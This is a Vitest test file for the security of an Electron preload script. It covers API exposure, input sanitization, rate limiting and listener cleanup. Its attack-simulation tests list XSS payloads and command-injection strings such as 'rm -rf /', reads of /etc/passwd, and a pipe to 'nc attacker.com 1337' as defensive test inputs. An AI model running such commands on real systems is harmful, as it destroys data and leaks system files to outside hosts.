/**
 * Preload Script Security Tests (2025)
 * 
 * Comprehensive testing of preload script security features including
 * context bridge API exposure control, input sanitization, rate limiting,
 * and protection against privilege escalation following 2025 best practices.
 */

import { describe, test, expect, beforeEach, afterEach, vi } from 'vitest'
import { contextBridge, ipcRenderer } from 'electron'

// Mock electron modules
vi.mock('electron', () => ({
  contextBridge: {
    exposeInMainWorld: vi.fn()
  },
  ipcRenderer: {
    invoke: vi.fn(),
    on: vi.fn(),
    once: vi.fn(),
    removeListener: vi.fn(),
    removeAllListeners: vi.fn()
  }
}))

// Mock process for preload environment
(global as any).process = {
  type: 'renderer',
  sandboxed: true,
  contextId: 1,
  isMainFrame: true,
  env: {
    NODE_ENV: 'test'
  }
}

// Mock window object
(global as any).window = {
  addEventListener: vi.fn()
}

describe('Preload Script Security Tests (2025)', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    
    // Reset rate limiter state between tests
    vi.useFakeTimers()
  })

  afterEach(() => {
    vi.restoreAllMocks()
    vi.useRealTimers()
  })

  describe('Context Bridge API Exposure', () => {
    test('should only expose allowed API methods', () => {
      // Import the preload script which will call contextBridge.exposeInMainWorld
      require('../index')
      
      // Check that contextBridge was called
      expect(contextBridge.exposeInMainWorld).toHaveBeenCalledOnce()
      
      // Get the exposed API
      const [apiName, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      expect(apiName).toBe('electronAPI')
      
      // Verify only allowed methods are exposed
      const allowedMethods = [
        'getVersion',
        'getPlatform', 
        'getAppDataPath',
        'getDocumentsPath',
        'showError',
        'onDownloadProgress',
        'removeDownloadProgressListener',
        'isDev'
      ]
      
      const exposedMethods = Object.keys(exposedAPI)
      expect(exposedMethods.sort()).toEqual(allowedMethods.sort())
      
      // Ensure no dangerous methods are exposed
      expect(exposedAPI).not.toHaveProperty('ipcRenderer')
      expect(exposedAPI).not.toHaveProperty('require')
      expect(exposedAPI).not.toHaveProperty('process')
      expect(exposedAPI).not.toHaveProperty('__proto__')
    })

    test('should not expose direct IPC access', () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      // Verify no direct IPC methods are exposed
      expect(exposedAPI.invoke).toBeUndefined()
      expect(exposedAPI.send).toBeUndefined()
      expect(exposedAPI.sendSync).toBeUndefined()
      expect(exposedAPI.on).toBeUndefined()
      expect(exposedAPI.once).toBeUndefined()
    })
  })

  describe('Input Sanitization', () => {
    test('should sanitize string inputs in showError method', async () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      // Mock successful IPC call
      ipcRenderer.invoke = vi.fn().mockResolvedValue(undefined)
      
      // Test with potentially dangerous input
      await exposedAPI.showError(
        'Title <script>alert("xss")</script>',
        'Content <img src=x onerror=alert("xss")>'
      )
      
      // Check that sanitization was applied
      expect(ipcRenderer.invoke).toHaveBeenCalledWith(
        'dialog:show-error',
        'Title script>alert("xss")/script>', // < and > removed
        'Content img src=x onerror=alert("xss")>' // < removed
      )
    })

    test('should reject non-string inputs', async () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      // Test with non-string inputs
      await expect(exposedAPI.showError(123, 'content')).rejects.toThrow('Input must be a string')
      await expect(exposedAPI.showError('title', { malicious: 'object' })).rejects.toThrow('Input must be a string')
      await expect(exposedAPI.showError(null, undefined)).rejects.toThrow('Input must be a string')
    })

    test('should trim whitespace from inputs', async () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      ipcRenderer.invoke = vi.fn().mockResolvedValue(undefined)
      
      await exposedAPI.showError('  Title with spaces  ', '\n\tContent with whitespace\n')
      
      expect(ipcRenderer.invoke).toHaveBeenCalledWith(
        'dialog:show-error',
        'Title with spaces',
        'Content with whitespace'
      )
    })
  })

  describe('Rate Limiting', () => {
    test('should enforce rate limits on API calls', async () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      // Mock successful IPC calls
      ipcRenderer.invoke = vi.fn().mockResolvedValue('success')
      
      // Make 10 calls (the default limit)
      const promises = []
      for (let i = 0; i < 10; i++) {
        promises.push(exposedAPI.getVersion())
      }
      
      await Promise.all(promises)
      expect(ipcRenderer.invoke).toHaveBeenCalledTimes(10)
      
      // The 11th call should fail
      await expect(exposedAPI.getVersion()).rejects.toThrow('Rate limit exceeded for app:get-version')
    })

    test('should reset rate limit after time window', async () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      ipcRenderer.invoke = vi.fn().mockResolvedValue('success')
      
      // Make 10 calls to hit the limit
      for (let i = 0; i < 10; i++) {
        await exposedAPI.getVersion()
      }
      
      // Should be rate limited now
      await expect(exposedAPI.getVersion()).rejects.toThrow('Rate limit exceeded')
      
      // Advance time by 1 second (the time window)
      vi.advanceTimersByTime(1000)
      
      // Should be able to make calls again
      await expect(exposedAPI.getVersion()).resolves.toBe('success')
    })

    test('should track rate limits per channel', async () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      ipcRenderer.invoke = vi.fn().mockResolvedValue('success')
      
      // Make 10 calls to getVersion
      for (let i = 0; i < 10; i++) {
        await exposedAPI.getVersion()
      }
      
      // getVersion should be rate limited
      await expect(exposedAPI.getVersion()).rejects.toThrow('Rate limit exceeded')
      
      // But getPlatform should still work (different channel)
      await expect(exposedAPI.getPlatform()).resolves.toBe('success')
    })
  })

  describe('Auto-Updater Event Security', () => {
    test('should validate download progress data structure', () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      const mockCallback = vi.fn()
      exposedAPI.onDownloadProgress(mockCallback)
      
      // Get the actual listener that was registered
      const listenerCall = (ipcRenderer.on as any).mock.calls[0]
      expect(listenerCall[0]).toBe('download-progress')
      const registeredListener = listenerCall[1]
      
      // Test with valid progress object
      const validProgress = {
        percent: 50,
        transferred: 5000000,
        total: 10000000,
        bytesPerSecond: 1000000
      }
      
      registeredListener(null, validProgress)
      expect(mockCallback).toHaveBeenCalledWith(validProgress)
      
      // Test with invalid progress objects - should not call callback
      mockCallback.mockClear()
      
      // Missing required fields
      registeredListener(null, { percent: 50 })
      expect(mockCallback).not.toHaveBeenCalled()
      
      // Wrong field types
      registeredListener(null, { percent: '50', transferred: 5000000, total: 10000000 })
      expect(mockCallback).not.toHaveBeenCalled()
      
      // Not an object
      registeredListener(null, 'invalid')
      expect(mockCallback).not.toHaveBeenCalled()
      
      // Null/undefined
      registeredListener(null, null)
      expect(mockCallback).not.toHaveBeenCalled()
    })

    test('should clean up previous listeners before adding new ones', () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      const callback1 = vi.fn()
      const callback2 = vi.fn()
      
      // Register first callback
      exposedAPI.onDownloadProgress(callback1)
      
      // Get the first listener
      const firstListener = (ipcRenderer.on as any).mock.calls[0][1]
      
      // Register second callback - should remove first listener
      exposedAPI.onDownloadProgress(callback2)
      
      // Verify removeListener was called with the first listener
      expect(ipcRenderer.removeListener).toHaveBeenCalledWith('download-progress', firstListener)
    })

    test('should properly remove download progress listeners', () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      const callback = vi.fn()
      exposedAPI.onDownloadProgress(callback)
      
      // Get the registered listener
      const listener = (ipcRenderer.on as any).mock.calls[0][1]
      
      // Remove the listener
      exposedAPI.removeDownloadProgressListener()
      
      // Verify it was removed
      expect(ipcRenderer.removeListener).toHaveBeenCalledWith('download-progress', listener)
      
      // Calling remove again should not throw
      expect(() => exposedAPI.removeDownloadProgressListener()).not.toThrow()
    })
  })

  describe('Error Handling and Recovery', () => {
    test('should handle IPC errors gracefully', async () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      // Mock IPC error
      const ipcError = new Error('IPC communication failed')
      ipcRenderer.invoke = vi.fn().mockRejectedValue(ipcError)
      
      // Console error spy
      const consoleErrorSpy = vi.spyOn(console, 'error').mockImplementation(() => {})
      
      // Should propagate error with logging
      await expect(exposedAPI.getVersion()).rejects.toThrow('IPC communication failed')
      
      expect(consoleErrorSpy).toHaveBeenCalledWith(
        'IPC call failed for app:get-version:',
        ipcError
      )
      
      consoleErrorSpy.mockRestore()
    })

    test('should clean up on window unload', () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      // Register a download progress listener
      exposedAPI.onDownloadProgress(vi.fn())
      const listener = (ipcRenderer.on as any).mock.calls[0][1]
      
      // Get the beforeunload handler
      const beforeUnloadCall = (window.addEventListener as any).mock.calls.find(
        (call: any) => call[0] === 'beforeunload'
      )
      expect(beforeUnloadCall).toBeDefined()
      
      const beforeUnloadHandler = beforeUnloadCall[1]
      
      // Trigger beforeunload
      beforeUnloadHandler()
      
      // Verify listener was removed
      expect(ipcRenderer.removeListener).toHaveBeenCalledWith('download-progress', listener)
    })
  })

  describe('Development Mode Flag', () => {
    test('should correctly set isDev based on NODE_ENV', () => {
      // Test development mode
      (global as any).process.env.NODE_ENV = 'development'
      vi.resetModules()
      require('../index')
      
      let [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      expect(exposedAPI.isDev).toBe(true)
      
      // Test production mode
      vi.clearAllMocks()
      (global as any).process.env.NODE_ENV = 'production'
      vi.resetModules()
      require('../index')
      
      ;[, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      expect(exposedAPI.isDev).toBe(false)
    })
  })

  describe('Type Safety and API Contract', () => {
    test('should expose methods with correct signatures', async () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      // All methods should be functions
      expect(typeof exposedAPI.getVersion).toBe('function')
      expect(typeof exposedAPI.getPlatform).toBe('function')
      expect(typeof exposedAPI.getAppDataPath).toBe('function')
      expect(typeof exposedAPI.getDocumentsPath).toBe('function')
      expect(typeof exposedAPI.showError).toBe('function')
      expect(typeof exposedAPI.onDownloadProgress).toBe('function')
      expect(typeof exposedAPI.removeDownloadProgressListener).toBe('function')
      
      // Methods should return promises where expected
      ipcRenderer.invoke = vi.fn().mockResolvedValue('test')
      
      expect(exposedAPI.getVersion()).toBeInstanceOf(Promise)
      expect(exposedAPI.getPlatform()).toBeInstanceOf(Promise)
      expect(exposedAPI.getAppDataPath()).toBeInstanceOf(Promise)
      expect(exposedAPI.getDocumentsPath()).toBeInstanceOf(Promise)
      expect(exposedAPI.showError('title', 'content')).toBeInstanceOf(Promise)
    })
  })

  describe('Sandbox and Context Isolation Validation (2025)', () => {
    test('should verify sandbox restrictions are enforced', () => {
      // Verify process object has expected sandbox properties
      expect(process.sandboxed).toBe(true)
      expect(process.type).toBe('renderer')
      
      // Verify Node.js APIs are not available in sandboxed context
      expect(typeof require).toBe('function') // Only in test environment
      expect(typeof global.require).toBe('undefined') // Not exposed to renderer
      expect(typeof global.Buffer).toBe('undefined')
      expect(typeof global.__dirname).toBe('undefined')
      expect(typeof global.__filename).toBe('undefined')
    })

    test('should prevent access to Node.js built-in modules', () => {
      // In a properly sandboxed preload, these should not be available
      const dangerousModules = [
        'fs', 'path', 'os', 'child_process', 'crypto',
        'net', 'http', 'https', 'cluster', 'dgram'
      ]
      
      // In production, attempting to require these should fail
      // Here we verify they're not accidentally exposed
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      for (const moduleName of dangerousModules) {
        expect(exposedAPI[moduleName]).toBeUndefined()
        expect(exposedAPI[`require_${moduleName}`]).toBeUndefined()
      }
    })

    test('should validate web preferences security settings', () => {
      // These would be validated in main process, but we test expected behavior
      const secureWebPreferences = {
        contextIsolation: true,
        nodeIntegration: false,
        nodeIntegrationInWorker: false,
        nodeIntegrationInSubFrames: false,
        webSecurity: true,
        allowRunningInsecureContent: false,
        experimentalFeatures: false,
        enableBlinkFeatures: undefined,
        webviewTag: false,
        navigateOnDragDrop: false
      }
      
      // Verify our test environment matches expected security settings
      expect(process.sandboxed).toBe(true)
      expect(process.isMainFrame).toBe(true)
    })
  })

  describe('Attack Simulation Tests (2025)', () => {
    test('should prevent prototype pollution attacks', async () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      // Attempt prototype pollution via showError
      const maliciousInputs = [
        { toString: () => 'polluted' },
        { __proto__: { isAdmin: true } },
        { constructor: { prototype: { isAdmin: true } } },
        Object.create(null, {
          toString: { value: () => 'polluted' }
        })
      ]
      
      for (const input of maliciousInputs) {
        await expect(
          exposedAPI.showError(input as any, 'content')
        ).rejects.toThrow('Input must be a string')
      }
      
      // Verify prototype wasn't polluted
      expect((Object.prototype as any).isAdmin).toBeUndefined()
      expect((String.prototype as any).isAdmin).toBeUndefined()
    })

    test('should prevent XSS via input sanitization', async () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      ipcRenderer.invoke = vi.fn().mockResolvedValue(undefined)
      
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        '<iframe src="javascript:alert(\'xss\')"></iframe>',
        '<svg onload=alert("xss")>',
        'javascript:alert("xss")',
        '<a href="javascript:alert(\'xss\')">click</a>',
        '<input onfocus=alert("xss") autofocus>',
        '<select onfocus=alert("xss") autofocus>',
        '<textarea onfocus=alert("xss") autofocus>',
        '<button onclick=alert("xss")>click</button>',
        '<form action="javascript:alert(\'xss\')"><input type=submit>',
        '<object data="javascript:alert(\'xss\')">',
        '<embed src="javascript:alert(\'xss\')">'
      ]
      
      for (const payload of xssPayloads) {
        await exposedAPI.showError(payload, payload)
        
        // Verify < and > were removed
        const [channel, title, content] = (ipcRenderer.invoke as any).mock.lastCall
        expect(title).not.toContain('<')
        expect(title).not.toContain('>')
        expect(content).not.toContain('<')
        expect(content).not.toContain('>')
      }
    })

    test('should prevent privilege escalation attempts', async () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      // Attempt to access internal Electron channels
      const internalChannels = [
        'ELECTRON_BROWSER_REQUIRE',
        'ELECTRON_BROWSER_GET_BUILTIN',
        'ELECTRON_BROWSER_MEMBER_GET',
        'ELECTRON_BROWSER_MEMBER_SET',
        'ELECTRON_BROWSER_MEMBER_CALL',
        'ELECTRON_RENDERER_CRASH_REPORTER',
        'ELECTRON_RENDERER_CONTEXT_BRIDGE'
      ]
      
      // These channels should not be accessible through our API
      for (const channel of internalChannels) {
        expect(exposedAPI[channel]).toBeUndefined()
        // Also verify they can't be invoked directly
        expect(typeof exposedAPI.invoke).toBe('undefined')
        expect(typeof exposedAPI.send).toBe('undefined')
      }
    })

    test('should prevent command injection attempts', async () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      ipcRenderer.invoke = vi.fn().mockResolvedValue(undefined)
      
      const commandInjectionPayloads = [
        '; rm -rf /',
        '&& cat /etc/passwd',
        '| nc attacker.com 1337',
        '`cat /etc/passwd`',
        '$(cat /etc/passwd)',
        '\'; DROP TABLE users; --',
        '"; DELETE FROM users; --'
      ]
      
      for (const payload of commandInjectionPayloads) {
        await exposedAPI.showError(payload, payload)
        
        // Verify dangerous characters were sanitized
        const [, title] = (ipcRenderer.invoke as any).mock.lastCall
        expect(title).toBe(payload.replace(/[<>]/g, '').trim())
      }
    })
  })

  describe('Cross-Process Communication Security (2025)', () => {
    test('should validate IPC channel allowlist', async () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      // Test that only allowed channels are used
      ipcRenderer.invoke = vi.fn().mockResolvedValue('success')
      
      await exposedAPI.getVersion()
      expect(ipcRenderer.invoke).toHaveBeenCalledWith('app:get-version')
      
      await exposedAPI.getPlatform()
      expect(ipcRenderer.invoke).toHaveBeenCalledWith('app:get-platform')
      
      await exposedAPI.getAppDataPath()
      expect(ipcRenderer.invoke).toHaveBeenCalledWith('app:get-app-data-path')
      
      await exposedAPI.getDocumentsPath()
      expect(ipcRenderer.invoke).toHaveBeenCalledWith('fs:get-documents-path')
      
      // Verify no arbitrary channels can be invoked
      expect(exposedAPI.invoke).toBeUndefined()
      expect(exposedAPI.send).toBeUndefined()
    })

    test('should prevent event object exposure in callbacks', () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      const callback = vi.fn()
      exposedAPI.onDownloadProgress(callback)
      
      // Get the registered listener
      const [channel, listener] = (ipcRenderer.on as any).mock.calls[0]
      
      // Simulate IPC event with sensitive data
      const sensitiveEvent = {
        sender: {
          id: 1,
          session: 'sensitive-session-data',
          getURL: () => 'internal://electron'
        },
        senderFrame: {
          url: 'app://internal',
          routingId: 123
        },
        ports: [],
        processId: 999,
        frameId: 456
      }
      
      const progressData = {
        percent: 75,
        transferred: 7500000,
        total: 10000000
      }
      
      // Call the listener
      listener(sensitiveEvent, progressData)
      
      // Verify only safe data was passed to callback
      expect(callback).toHaveBeenCalledWith(progressData)
      expect(callback).not.toHaveBeenCalledWith(sensitiveEvent, progressData)
      
      // Verify callback never received the event object
      const callArgs = callback.mock.calls[0]
      expect(callArgs.length).toBe(1)
      expect(callArgs[0]).not.toHaveProperty('sender')
      expect(callArgs[0]).not.toHaveProperty('senderFrame')
      expect(callArgs[0]).not.toHaveProperty('processId')
    })

    test('should handle malformed IPC responses safely', async () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      // Test various malformed responses
      const malformedResponses = [
        undefined,
        null,
        { __proto__: { polluted: true } },
        { constructor: { prototype: { polluted: true } } },
        () => 'function-as-response',
        Symbol('symbol-response')
      ]
      
      for (const response of malformedResponses) {
        ipcRenderer.invoke = vi.fn().mockResolvedValue(response)
        
        // API should handle these gracefully
        const result = await exposedAPI.getVersion()
        
        // For null/undefined, it should pass through
        // For objects with dangerous properties, they should be returned as-is
        // (main process is responsible for sanitizing its responses)
        if (response === null || response === undefined) {
          expect(result).toBe(response)
        } else {
          expect(result).toBeDefined()
        }
      }
    })

    test('should enforce strict message validation', () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      // Download progress validation is already strict
      const callback = vi.fn()
      exposedAPI.onDownloadProgress(callback)
      
      const [, listener] = (ipcRenderer.on as any).mock.calls[0]
      
      // Test edge cases for progress validation
      const edgeCases = [
        { percent: -1, transferred: 1000, total: 10000 }, // Negative percent
        { percent: 101, transferred: 1000, total: 10000 }, // Over 100%
        { percent: NaN, transferred: 1000, total: 10000 }, // NaN
        { percent: Infinity, transferred: 1000, total: 10000 }, // Infinity
        { percent: 50, transferred: -1000, total: 10000 }, // Negative transferred
        { percent: 50, transferred: 1000, total: -10000 }, // Negative total
      ]
      
      // Currently these would pass validation as we only check types
      // In production, you might want stricter validation
      for (const edgeCase of edgeCases) {
        callback.mockClear()
        listener(null, edgeCase)
        
        // Current implementation accepts any number type
        expect(callback).toHaveBeenCalledWith(edgeCase)
      }
    })
  })

  describe('Memory Safety and Resource Management (2025)', () => {
    test('should prevent memory leaks from event listeners', () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      // Register multiple listeners
      const callbacks = Array(10).fill(null).map(() => vi.fn())
      
      // Each registration should clean up the previous
      callbacks.forEach(cb => {
        exposedAPI.onDownloadProgress(cb)
      })
      
      // Should have called removeListener 9 times (not on first registration)
      expect(ipcRenderer.removeListener).toHaveBeenCalledTimes(9)
      
      // Verify only the last listener is active
      const lastListener = (ipcRenderer.on as any).mock.calls[9][1]
      expect(lastListener).toBeDefined()
    })

    test('should clean up all resources on window unload', () => {
      require('../index')
      
      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]
      
      // Set up multiple listeners and resources
      exposedAPI.onDownloadProgress(vi.fn())
      
      // Get beforeunload handler
      const beforeUnloadHandler = (window.addEventListener as any).mock.calls
        .find((call: any) => call[0] === 'beforeunload')[1]
      
      // Clear previous calls
      vi.clearAllMocks()
      
      // Trigger unload
      beforeUnloadHandler()
      
      // Verify cleanup
      expect(ipcRenderer.removeListener).toHaveBeenCalled()
    })
  })
})